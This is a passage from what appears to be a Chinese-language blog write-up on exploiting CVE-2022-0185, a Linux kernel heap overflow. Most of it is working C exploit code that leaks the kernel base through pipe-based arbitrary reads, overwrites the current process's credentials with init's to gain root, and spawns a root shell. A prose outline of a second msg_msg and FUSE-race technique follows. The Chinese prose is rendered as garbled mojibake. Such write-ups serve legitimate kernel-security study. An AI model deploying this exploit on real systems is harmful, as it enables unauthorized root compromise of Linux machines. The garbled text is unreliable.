vmemmap_base[156] page.</span><br><span class="hljs-comment">     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span><br><span class="hljs-comment">     */</span><br>    vmemmap_base = (<span class="hljs-type">size_t</span>) info_pipe_buf.page &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br>    try_times = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Checking whether the %lx is vmemmap_base..\n&quot;</span>,vmemmap_base);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + <span class="hljs-number">157</span> * <span class="hljs-number">0x40</span>), buf);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[?] Get possible data: %lx\n&quot;</span>, buf[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-number">0x2400000000</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;READING FAILED FOR UNKNOWN REASON!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x030</span>)) &#123;<br>            kernel_base = buf[<span class="hljs-number">0</span>] -  <span class="hljs-number">0x030</span>;<br>            kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, <br>                   kernel_base, kernel_offset);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        try_times++;<br>        <span class="hljs-keyword">if</span> (try_times == <span class="hljs-number">5</span>) &#123;<br>            vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>            try_times = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * For a machine with MEM less than 256M, we can simply get the:</span><br><span class="hljs-comment">     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span><br><span class="hljs-comment">     * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span><br><span class="hljs-comment">     * So we need to find another way to calculate the page_offset_base.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Luckily the task_struct::ptraced points to itself, so we can get the</span><br><span class="hljs-comment">     * page_offset_base by vmmemap and current task_struct as we know the page.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Note that the offset of different filed should be referred to your env.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + (i<span class="hljs-number">-1</span>)*<span class="hljs-number">0x40</span>), buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>), <br>                               &amp;((<span class="hljs-type">char</span>*)buf)[<span class="hljs-number">0x1000</span>]);<br>    <br>        comm_addr = memmem(buf, <span class="hljs-number">0x1ff0</span>, <span class="hljs-string">&quot;arttPWNnba3&quot;</span>, <span class="hljs-number">11</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((((<span class="hljs-type">size_t</span>) comm_addr - (<span class="hljs-type">size_t</span>) buf) &amp; <span class="hljs-number">0xfff</span>) &lt; <span class="hljs-number">500</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Found string at page: %lx\n&quot;</span>, vmemmap_base + i * <span class="hljs-number">0x40</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] String offset: %lx\n&quot;</span>, <br>                                   ((<span class="hljs-type">size_t</span>) comm_addr - (<span class="hljs-type">size_t</span>) buf) &amp; <span class="hljs-number">0xfff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] comm_addr[-2]: %lx\n&quot;</span>, comm_addr[<span class="hljs-number">-2</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] comm_addr[-3]: %lx\n&quot;</span>, comm_addr[<span class="hljs-number">-3</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] comm_addr[-52]: %lx\n&quot;</span>, comm_addr[<span class="hljs-number">-52</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] comm_addr[-53]: %lx\n&quot;</span>, comm_addr[<span class="hljs-number">-53</span>]);<br>        <span class="hljs-keyword">if</span> ((comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-53</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-52</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-53</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-46</span>] - <span class="hljs-number">2280</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-46</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,<br>                   (<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage VI - Hijack current task_struct to get the root&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) ptask_page_addr, buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (ptask_page_addr+<span class="hljs-number">0x40</span>),&amp;buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">278</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">278</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">329</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">341</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">328</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">329</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">341</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>),<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> msg_pipe[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">signal_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Receive signal %d!\n&quot;</span>, nr);<br>    sleep(<span class="hljs-number">114514</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] CVE-2022-0185 - exploit by arttnba3&quot;</span>);<br><br>    signal(SIGSEGV, signal_handler);<br><br>    pipe(msg_pipe);<br><br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>        <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNS | CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to unshare()!&quot;</span>);<br>        &#125;<br><br>        bind_core(<span class="hljs-number">0</span>);<br><br>        occupy_4k_obj_by_msg();sleep(<span class="hljs-number">1</span>);<br>        corrupting_first_level_pipe_for_page_uaf();sleep(<span class="hljs-number">1</span>);<br>        corrupting_second_level_pipe_for_pipe_uaf();sleep(<span class="hljs-number">1</span>);<br>        building_self_writing_pipe();sleep(<span class="hljs-number">1</span>);<br>        info_leaking_by_arbitrary_pipe();sleep(<span class="hljs-number">1</span>);<br>        privilege_escalation_by_task_overwrite();sleep(<span class="hljs-number">1</span>);<br><br>        write(msg_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>        sleep(<span class="hljs-number">114514</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">char</span> ch;<br><br>        <span class="hljs-keyword">if</span> (prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttPWNnba3&quot;</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;FAILED to prctl()!&quot;</span>);<br>        &#125;<br><br>        read(msg_pipe[<span class="hljs-number">0</span>], &amp;ch, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒ</p><p><img src="https://s2.loli.net/2023/05/28/945bYFSHmBfLKr7.png" alt="image.png"></p><h2 id="æ–¹æ³•äºŒã€ç»“åˆ-FUSE-msg-msg-è¿›è¡Œä»»æ„åœ°å€å†™"><a href="#æ–¹æ³•äºŒã€ç»“åˆ-FUSE-msg-msg-è¿›è¡Œä»»æ„åœ°å€å†™" class="headerlink" title="æ–¹æ³•äºŒã€ç»“åˆ FUSE + msg_msg è¿›è¡Œä»»æ„åœ°å€å†™"></a>æ–¹æ³•äºŒã€ç»“åˆ FUSE + <code>msg_msg</code> è¿›è¡Œä»»æ„åœ°å€å†™</h2><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ä»»æ„é•¿åº¦çš„å †æº¢å‡ºï¼Œè€Œå¯æº¢å‡ºå¯¹è±¡ç”¨çš„åˆ†é… flag ä¸º <code>GFP_KERNEL</code>ã€å¤§å°ä¸º 4kï¼ˆä¸€å¼ å†…å­˜é¡µå¤§å°ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°å¯ä»¥åŸºäº<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">æˆ‘ä»¬çš„è€æœ‹å‹ System V æ¶ˆæ¯é˜Ÿåˆ—ç»“æ„ä½“</a>æ¥å®Œæˆåˆ©ç”¨</p><h3 id="Step-I-å †å–·-msg-msgï¼Œè¦†å†™-m-ts-å­—æ®µè¿›è¡Œè¶Šç•Œè¯»å–"><a href="#Step-I-å †å–·-msg-msgï¼Œè¦†å†™-m-ts-å­—æ®µè¿›è¡Œè¶Šç•Œè¯»å–" class="headerlink" title="Step.I - å †å–· msg_msgï¼Œè¦†å†™ m_ts å­—æ®µè¿›è¡Œè¶Šç•Œè¯»å–"></a>Step.I - å †å–· msg_msgï¼Œè¦†å†™ m_ts å­—æ®µè¿›è¡Œè¶Šç•Œè¯»å–</h3><p>æˆ‘ä»¬å…ˆæ¥å¤ä¹ ä¸€ä¸‹æ¶ˆæ¯é˜Ÿåˆ—ä¸­ä¸€æ¡æ¶ˆæ¯çš„åŸºæœ¬ç»“æ„ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ msgsnd ç³»ç»Ÿè°ƒç”¨åœ¨æŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸€æ¡æŒ‡å®šå¤§å°çš„ message æ—¶ï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­ä¼šåˆ›å»ºè¿™æ ·ä¸€ä¸ªç»“æ„ä½“ä½œä¸ºä¿¡æ¯çš„ headerï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨å•ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸€æ¡æ¶ˆæ¯æ—¶ï¼Œè‹¥å¤§å°<strong>ä¸å¤§äºã€ä¸€ä¸ªé¡µé¢å¤§å° - header sizeã€‘</strong>ï¼Œåˆ™ä»…ä½¿ç”¨ä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“è¿›è¡Œå­˜å‚¨ï¼Œè€Œå½“æˆ‘ä»¬å•æ¬¡å‘é€<strong>å¤§äºã€ä¸€ä¸ªé¡µé¢å¤§å° - header sizeã€‘</strong>å¤§å°çš„æ¶ˆæ¯æ—¶ï¼Œå†…æ ¸ä¼šé¢å¤–è¡¥å……æ·»åŠ  <code>msg_msgseg</code> ç»“æ„ä½“ï¼Œå…¶ä¸ <code>msg_msg</code> ä¹‹é—´å½¢æˆå¦‚ä¸‹å•å‘é“¾è¡¨ç»“æ„ï¼Œè€Œå•ä¸ª <code>msg_msgseg</code> çš„å¤§å°æœ€å¤§ä¸ºä¸€ä¸ªé¡µé¢å¤§å°ï¼Œè¶…å‡ºè¿™ä¸ªèŒƒå›´çš„æ¶ˆæ¯å†…æ ¸ä¼šé¢å¤–è¡¥å……ä¸Šæ›´å¤šçš„ <code>msg_msgseg</code> ç»“æ„ä½“ï¼Œé“¾è¡¨æœ€åä»¥ NULL ç»“å°¾ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>ç”±äºæˆ‘ä»¬æœ‰è¶Šç•Œå†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥å°† <code>msg_msg</code> ä¸ <code>ctx-&gt;legacy_data</code> å †å–·åˆ°ä¸€èµ·ï¼Œä¹‹åè¶Šç•Œå†™å…¥ç›¸é‚» <code>msg_msg</code> çš„ header å°† <code>m_ts</code> æ”¹å¤§ï¼Œä¹‹åæˆ‘ä»¬å†ä½¿ç”¨ <code>msgrcv()</code> è¯»å–æ¶ˆæ¯ï¼Œä¾¿èƒ½è¯»å–å‡ºè¶…å‡ºè¯¥æ¶ˆæ¯èŒƒå›´çš„å†…å®¹ï¼Œä»è€Œå®Œæˆè¶Šç•Œè¯»å–ï¼›ç”±äºæˆ‘ä»¬çš„è¶Šç•Œå†™å…¥ä¼šç ´å <code>msg_msg</code> å¤´éƒ¨çš„åŒå‘é“¾è¡¨ï¼Œå› æ­¤åœ¨è¯»å–æ—¶æˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>MSG_COPY</code> ä»¥ä¿æŒæ¶ˆæ¯åœ¨é˜Ÿåˆ—ä¸Šä¸ä¼šè¢« unlink</p><p>ç”±äº <code>ctx-&gt;legacy_data</code> çš„å¤§å°å·²ç»æ˜¯ 4k äº†ï¼Œæ•…æˆ‘ä»¬è€ƒè™‘åœ¨ <code>msg_msgseg</code> ä¸Šå®Œæˆè¶Šç•Œè¯»å–ï¼Œç”±äº <code>msgrcv()</code> æ‹·è´æ¶ˆæ¯æ—¶ä»¥å•é“¾è¡¨ç»“å°¾ NULL ä½œä¸ºç»ˆæ­¢ï¼Œæ•…æˆ‘ä»¬æœ€å¤šå¯ä»¥åœ¨ <code>msg_msgseg</code> ä¸Šè¯»å–å°†è¿‘ä¸€å¼ å†…å­˜é¡µå¤§å°çš„æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬è€ƒè™‘è®© <code>msg_msgseg</code> çš„æ¶ˆæ¯å°½é‡å°ï¼Œä»è€Œè®©æˆ‘ä»¬èƒ½å¤Ÿè¶Šç•Œè¯»å–åˆ°æ›´å¤šçš„ object</p><p>æ¥ä¸‹æ¥è€ƒè™‘å¦‚ä½•ä½¿ç”¨è¶Šç•Œè¯»å–è¿›è¡Œæ•°æ®æ³„éœ²ï¼Œè¿™é‡Œæˆ‘ä»¬è€ƒè™‘å †å–·å…¶ä»–çš„å¯ä»¥æ³„éœ²æ•°æ®çš„å°ç»“æ„ä½“ä¸æˆ‘ä»¬çš„ <code>msg_msgseg</code> æ··åœ¨ä¸€èµ·ï¼Œä»è€Œä½¿å¾—æˆ‘ä»¬è¶Šç•Œè¯»å–æ—¶å¯ä»¥ç›´æ¥è¯»åˆ°æˆ‘ä»¬å †å–·çš„è¿™äº›å°ç»“æ„ä½“ï¼Œä»è€Œæ³„éœ²å‡ºå†…æ ¸ä»£ç æ®µåŠ è½½åŸºåœ°å€ï¼Œé‚£ä¹ˆè¿™é‡Œç¬”è€…è€ƒè™‘å †å–· <a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x02-seq-file-%E7%9B%B8%E5%85%B3">seq_operations</a> æ¥å®Œæˆæ•°æ®çš„æ³„éœ²</p><p>ä¸ºäº†æé«˜è¶Šç•Œå†™å…¥ <code>msg_msg</code> çš„æˆåŠŸç‡ï¼Œç¬”è€…é€‰æ‹©å…ˆå †å–·ä¸€éƒ¨åˆ† <code>msg_msg</code>ï¼Œä¹‹ååˆ†é…  <code>ctx-&gt;legacy_data</code> ï¼Œ æ¥ä¸‹æ¥å†å †å–·å¦ä¸€éƒ¨åˆ† <code>msg_msg</code>ä¸ºäº†æé«˜æ•°æ®æ³„éœ²çš„æˆåŠŸæ¦‚ç‡ï¼Œç¬”è€…é€‰æ‹©åœ¨æ¯æ¬¡åœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€æ¶ˆæ¯æ—¶éƒ½å–·ä¸€ä¸ª <code>seq_operations</code>ï¼Œåœ¨å®Œæˆæ¶ˆæ¯é˜Ÿåˆ—çš„å‘é€ä¹‹åå†å–·å°„å¤§é‡çš„ <code>seq_operations</code></p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬çš„è¶Šç•Œå†™å¹¶ä¸ä¸€å®šèƒ½å†™åˆ°ç›¸é‚»çš„ <code>msg_msg</code>ï¼Œä¹Ÿå¯èƒ½å†™åˆ°å…¶ä»–ç»“æ„ä½“æˆ–æ˜¯ free objectï¼Œè‹¥ free object çš„ next æŒ‡é’ˆåˆšå¥½ä½äºå¼€å¤´è¢«æˆ‘ä»¬ overwrite äº†ï¼Œåˆ™ä¼šåœ¨åé¢çš„åˆ†é…ä¸­å¯¼è‡´ kernel panic</p><h3 id="Step-II-å †å–·-msg-msgï¼Œåˆ©ç”¨-FUSE-åœ¨æ¶ˆæ¯æ‹·è´æ—¶è¦†å†™-next-å­—æ®µè¿›è¡Œä»»æ„åœ°å€å†™"><a href="#Step-II-å †å–·-msg-msgï¼Œåˆ©ç”¨-FUSE-åœ¨æ¶ˆæ¯æ‹·è´æ—¶è¦†å†™-next-å­—æ®µè¿›è¡Œä»»æ„åœ°å€å†™" class="headerlink" title="Step.II - å †å–· msg_msgï¼Œåˆ©ç”¨ FUSE åœ¨æ¶ˆæ¯æ‹·è´æ—¶è¦†å†™ next å­—æ®µè¿›è¡Œä»»æ„åœ°å€å†™"></a>Step.II - å †å–· msg_msgï¼Œåˆ©ç”¨ FUSE åœ¨æ¶ˆæ¯æ‹·è´æ—¶è¦†å†™ next å­—æ®µè¿›è¡Œä»»æ„åœ°å€å†™</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¯¥è€ƒè™‘å¦‚ä½•è¿›è¡Œææƒçš„å·¥ä½œäº†ï¼Œé€šè¿‡è¦†å†™ <code>msg_msg</code> çš„æ–¹å¼æˆ‘ä»¬åŒæ ·å¯ä»¥è¿›è¡Œä»»æ„åœ°å€å†™çš„æ“ä½œï¼Œç”±äºæ¶ˆæ¯å‘é€æ—¶åœ¨ <code>do_msgsnd()</code> å½“ä¸­æ˜¯å…ˆåˆ†é…å¯¹åº”çš„ <code>msg_msg</code> ä¸ <code>msg_msgseg</code> é“¾è¡¨ä½œä¸ºæ¶ˆæ¯çš„å­˜å‚¨ç©ºé—´å†è¿›è¡Œæ‹·è´ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥å…ˆå‘é€ä¸€ä¸ªå¤§äºä¸€å¼ å†…å­˜é¡µå¤§å°çš„æ¶ˆæ¯ï¼Œè¿™æ ·ä¼šåˆ†é…ä¸€ä¸ª 4k çš„ <code>msg_msg</code> ä¸ä¸€ä¸ª <code>msg_msgseg</code> ï¼Œåœ¨ <code>do_msgsnd()</code> ä¸­å®Œæˆç©ºé—´åˆ†é…ååœ¨ <code>msg_msg</code> ä¸Šè¿›è¡Œæ•°æ®æ‹·è´çš„æ—¶å€™ï¼Œæˆ‘ä»¬åœ¨å¦ä¸€ä¸ªçº¿ç¨‹å½“ä¸­ä½¿ç”¨è¶Šç•Œå†™æ›´æ”¹ <code>msg_msg</code> çš„ headerï¼Œä½¿å…¶ next æŒ‡é’ˆæ›´æ”¹åˆ°æˆ‘ä»¬æƒ³è¦å†™å…¥æ•°æ®çš„åœ°æ–¹ï¼Œå½“ <code>do_msgsnd()</code> å¼€å§‹å°†æ•°æ®æ‹·è´åˆ° <code>msg_msgseg</code> ä¸Šæ—¶ï¼Œç”±äº <code>msg_msg</code> çš„ next æŒ‡é’ˆå·²ç»è¢«æˆ‘ä»¬æ‰€æ›´æ”¹ï¼Œæ•…å…¶ä¼šå°†æ•°æ®å†™å…¥åˆ°æˆ‘ä»¬æŒ‡å®šçš„åœ°å€ä¸Šï¼Œä»è€Œå®Œæˆä»»æ„åœ°å€å†™</p><p><img src="https://s2.loli.net/2023/01/10/JxidQjuHn6ZKs4l.png" alt="image.png"></p><p>ä¸è¿‡ <code>do_msgsnd()</code> çš„æ‰€æœ‰æ“ä½œåœ¨ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ä¸­å®Œæˆï¼Œå› æ­¤è¿™éœ€è¦æˆ‘ä»¬è¿›è¡Œæ¡ä»¶ç«äº‰ï¼Œè€Œå¸¸è§„çš„æ¡ä»¶ç«äº‰é€šå¸¸å¾ˆéš¾æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd%EF%BC%88may-obsolete%EF%BC%89">userfaultfd</a> è®©  <code>do_msgsnd()</code> åœ¨æ‹·è´æ•°æ®åˆ°  <code>msg_msg</code>  æ—¶è§¦å‘ç”¨æˆ·ç©ºé—´çš„ç¼ºé¡µå¼‚å¸¸ï¼Œé™·å…¥åˆ°æˆ‘ä»¬çš„ page fault handler ä¸­ï¼Œæˆ‘ä»¬åœ¨ handler çº¿ç¨‹ä¸­å†è¿›è¡Œè¶Šç•Œå†™ï¼Œä¹‹åæ¢å¤åˆ°åŸçº¿ç¨‹ï¼Œè¿™æ ·åˆ©ç”¨çš„æˆåŠŸç‡ä¾¿å¤§å¤§æé«˜äº†</p><p><img src="https://i.loli.net/2021/09/08/i4C7oOvHdG2RqUm.png" alt="image.png"></p><p>ä½†æ˜¯è‡ª kernel ç‰ˆæœ¬ 5.11 èµ·<strong>éç‰¹æƒç”¨æˆ·æ— æ³•ä½¿ç”¨ userfaultfd</strong>ï¼Œè€Œè¯¥æ¼æ´å½±å“çš„å†…æ ¸ç‰ˆæœ¬åŒ…æ‹¬ 5.11ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ›´ä¸ºé€šç”¨çš„åŠæ³•â€”â€”<strong>ç”¨æˆ·ç©ºé—´æ–‡ä»¶ç³»ç»Ÿ</strong>ï¼ˆfilesystem in userspaceï¼Œ<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#FUSE-race">FUSE</a>ï¼‰å¯ä»¥è¢«ç”¨ä½œ userfaultfd 